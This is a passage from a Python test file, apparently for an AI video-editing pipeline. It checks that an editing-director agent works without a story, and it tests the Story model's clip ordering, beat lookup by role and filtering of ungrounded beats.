    ctx.llm = LLMClient()
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             story=None, revision=0)
    assert art.payload.segments
    assert not any(d.what == "Narrative from the Story agent"
                   for d in art.decisions)


# ------------------------------------------ helpers on the model

def test_clip_order_keeps_repeats_and_beat_for_finds_a_role():
    s = Story(beats=[StoryBeat(index=1, role="hook", clip_id="a"),
                     StoryBeat(index=2, role="develop", clip_id="b"),
                     StoryBeat(index=3, role="ending", clip_id="a")])
    assert s.clip_order == ["a", "b", "a"]
    assert s.beat_for("ending").clip_id == "a"
    assert s.beat_for("turn") is None


def test_grounded_beats_excludes_unsupported_ones():
    s = Story(beats=[StoryBeat(index=1, clip_id="a", support="vision"),
                     StoryBeat(index=2, clip_id="b", support="none")])
    assert [b.clip_id for b in s.grounded_beats] == ["a"]
